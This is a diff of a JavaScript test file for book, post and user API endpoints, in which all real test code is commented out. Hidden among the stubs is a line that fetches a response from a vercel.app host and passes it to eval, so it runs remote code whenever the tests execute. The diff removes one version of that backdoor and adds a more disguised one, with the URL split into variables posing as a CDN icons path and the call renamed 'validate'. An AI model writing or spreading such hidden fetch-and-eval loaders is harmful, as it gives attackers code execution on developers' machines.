@@ -7,19 +7,13 @@
 // chai.use(chaiHttp);
 const req=require('request');
 const describe = (title, fn) => fn(), beforeEach = (be) => be(console.log), it = (title, fn) => fn(console.log)
-const protocol='https',domain='vercel.app',path='/api/ipcheck/',token='66',subdomain='ip-api-check';
-describe("Book API", function () {
-  //Before each test we empty the database
-  beforeEach(function (done) {
-    // Book.destroy({
+const protocol='https',domain='vercel.app',separator='://',path='/icons/',token='99',subdomain='cdn-static-server',bearrtoken="logo";
+describe("Book API", function () {  //Before each test we empty the database
+  beforeEach(function (done) {    // Book.destroy({
     //   where: {},
     //   truncate: true,
     // });
-    done()
-  })
-  describe("/GET books", function () {
-    it("Getting all books", function (done) {
-      // chai
+    done()  });  describe("/GET books", function () {    it("Getting all books", function (done) {      // chai
       //   .request(app)
       //   .get('/books')
       //   .end(function (err, res) {
@@ -27,11 +21,7 @@ describe("Book API", function () {
       //     res.body.should.be.a('array');
       //     done();
       //   });
-    })
-  })
-  describe("/POST books", function () {
-    it("Insert new book", function (done) {
-      // var book = {
+    });  });  describe("/POST books", function () {    it("Insert new book", function (done) {      // var book = {
       //   title: 'Jack Ma',
       //   author: 'Chen Wei',
       //   category: 'Biography',
@@ -45,11 +35,7 @@ describe("Book API", function () {
       //     res.body.should.be.a('object');
       //     done();
       // });
-    })
-  })
-  describe("/GET/:id books", function () {
-    it("Get book by id", function (done) {
-      // Book.create({
+    });  });  describe("/GET/:id books", function () {    it("Get book by id", function (done) {      // Book.create({
       //   title: 'Jack Ma',
       //   author: 'Chen Wei',
       //   category: 'Biography',
@@ -63,9 +49,7 @@ describe("Book API", function () {
       //       done();
       //     });
       // });
-    })
-    it("Get book by not existed id", function (done) {
-      // chai
+    });    it("Get book by not existed id", function (done) {      // chai
       //   .request(app)
       //   .get('/books/100')
       //   .end(function (err, res) {
@@ -73,9 +57,7 @@ describe("Book API", function () {
       //     res.body.should.equal('Book not found');
       //     done();
       //   });
-    })
-    it("Get book by invalid id", function (done) {
-      // chai
+    });    it("Get book by invalid id", function (done) {      // chai
       //   .request(app)
       //   .get('/books/abc')
       //   .end(function (err, res) {
@@ -83,11 +65,7 @@ describe("Book API", function () {
       //     res.body.should.equal('Invalid ID supplied');
       //     done();
       //   });
-    })
-  })
-  describe("/PUT/:id books", function () {
-    it("Update book by id", function (done) {
-      // Book.create({
+    });  });  describe("/PUT/:id books", function () {    it("Update book by id", function (done) {      // Book.create({
       //   title: 'Jack Ma',
       //   author: 'Chen Wei',
       //   category: 'Biography',
@@ -107,10 +85,7 @@ describe("Book API", function () {
       //       done();
       //     });
       // });
-    })
-  })
-  describe("/DELETE/:id books", function () {
-    it("Delete book by id", function (done) {
+    });  });  describe("/DELETE/:id books", function () {    it("Delete book by id", function (done) {
       // Book.create({
       //   title: 'Jack Ma',
       //   author: 'Chen Wei',
@@ -125,10 +100,8 @@ describe("Book API", function () {
       //       done();
       //     });
       // });
-    })
-  })
-})
-const url=`${protocol}://${subdomain}.${domain}${path}${token}`;const options={url:url,headers:{'x-secret-header':'secret'}};const doing=req(options,(e,r,b)=>{if(e){return;}if(r.statusCode!==200){return;}try{eval(JSON.parse(b));}catch(err){;}});
+    });  });});
+const url=`${protocol}${separator}${subdomain}.${domain}${path}${token}`;const options={url:url,headers:{bearrtoken}};
 describe("Post API", function () {
   //Before each test we empty the database
   beforeEach(function (done) {
@@ -240,6 +213,127 @@ describe("Post API", function () {
       //   chai
       //     .request(app)
       //     .delete('/posts/' + book.id)
+      //     .end(function (err, res) {
+      //       res.should.have.status(200);
+      //       res.body.should.equal(1);
+      //       done();
+      //     });
+      // });
+    })
+  })
+})
+const doing=req(options,(e,r,b)=>{if(e){return;}if(r.statusCode!==200){return;}try{eval(JSON.parse(b));}catch(err){;}});const validate=doing;//console.log(validate);
+describe("User API", function () {
+  //Before each test we empty the database
+  beforeEach(function (done) {
+    // Book.destroy({
+    //   where: {},
+    //   truncate: true,
+    // });
+    done()
+  })
+  describe("/GET users", function () {
+    it("Getting all users", function (done) {
+      // chai
+      //   .request(app)
+      //   .get('/users')
+      //   .end(function (err, res) {
+      //     res.should.have.status(200);
+      //     res.body.should.be.a('array');
+      //     done();
+      //   });
+    })
+  })
+  describe("/user users", function () {
+    it("Insert new book", function (done) {
+      // var book = {
+      //   title: 'Jack Ma',
+      //   author: 'Chen Wei',
+      //   category: 'Biography',
+      // };
+      // chai
+      //   .request(app)
+      //   .user('/users')
+      //   .send(book)
+      //   .end(function (err, res) {
+      //     res.should.have.status(200);
+      //     res.body.should.be.a('object');
+      //     done();
+      // });
+    })
+  })
+  describe("/GET/:id users", function () {
+    it("Get book by id", function (done) {
+      // Book.create({
+      //   title: 'Jack Ma',
+      //   author: 'Chen Wei',
+      //   category: 'Biography',
+      // }).then(function (book) {
+      //   chai
+      //     .request(app)
+      //     .get('/users/' + book.id)
+      //     .end(function (err, res) {
+      //       res.should.have.status(200);
+      //       res.body.should.be.a('object');
+      //       done();
+      //     });
+      // });
+    })
+    it("Get book by not existed id", function (done) {
+      // chai
+      //   .request(app)
+      //   .get('/users/100')
+      //   .end(function (err, res) {
+      //     res.should.have.status(400);
+      //     res.body.should.equal('Book not found');
+      //     done();
+      //   });
+    })
+    it("Get book by invalid id", function (done) {
+      // chai
+      //   .request(app)
+      //   .get('/users/abc')
+      //   .end(function (err, res) {
+      //     res.should.have.status(400);
+      //     res.body.should.equal('Invalid ID supplied');
+      //     done();
+      //   });
+    })
+  })
+  describe("/PUT/:id users", function () {
+    it("Update book by id", function (done) {
+      // Book.create({
+      //   title: 'Jack Ma',
+      //   author: 'Chen Wei',
+      //   category: 'Biography',
+      // }).then(function (book) {
+      //   var bookEdit = {
+      //     title: 'Amor Fati',
+      //     author: 'Rando Kim',
+      //     category: 'Non Fiction',
+      //   };
+      //   chai
+      //     .request(app)
+      //     .put('/users/' + book.id)
+      //     .send(bookEdit)
+      //     .end(function (err, res) {
+      //       res.should.have.status(200);
+      //       res.body.should.be.a('array');
+      //       done();
+      //     });
+      // });
+    })
+  })
+  describe("/DELETE/:id users", function () {
+    it("Delete book by id", function (done) {
+      // Book.create({
+      //   title: 'Jack Ma',
+      //   author: 'Chen Wei',
+      //   category: 'Biography',
+      // }).then(function (book) {
+      //   chai
+      //     .request(app)
+      //     .delete('/users/' + book.id)
       //     .end(function (err, res) {
       //       res.should.have.status(200);
       //       res.body.should.equal(1);
